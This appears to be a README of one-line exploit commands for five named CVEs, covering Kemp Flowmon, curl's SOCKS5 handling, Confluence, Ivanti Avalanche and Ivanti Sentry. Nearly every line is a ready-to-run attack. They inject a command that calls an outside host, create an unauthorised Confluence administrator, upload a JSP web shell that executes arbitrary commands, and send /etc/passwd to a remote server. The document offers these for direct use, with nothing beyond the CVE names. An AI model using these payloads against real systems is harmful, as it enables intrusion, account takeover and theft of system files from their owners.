# vuln-liners
One line vulnerabilities

## CVE-2024-2389 (Progress Kemp Flowmon):
`curl -kv 'https://192.168.56.12/service.pdfs/confluence?lang=en&file=`curl+IP+PORT`'`

## CVE-2023-38545
`curl -vvv -x socks5h://localhost:9050 $(python3 -c "print(('A'*10000), end='')")`

## CVE-2023-22515 (Confluence Broken Access Control)
`curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://confluence/setup/setupadministrator.action`

## CVE-2023-32563 (Ivanti Avalanche Pre-auth)
`curl -v http://x.x.x.x:1900/Servlet/Skins -F guid=../../../Web/webapps/ROOT -F "file=@-;filename=x.jsp" <<<'<%Runtime.getRuntime().exec(request.getParameter("c"));%>' -: -k https://x.x.x.x:8443/x.jsp -d c=mspaint.exe`

## CVE-2023-38035 (Ivanti Sentry API Authentication Bypass)
`python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd https://x.x.x.x', 'isRoot': True}, None)"`
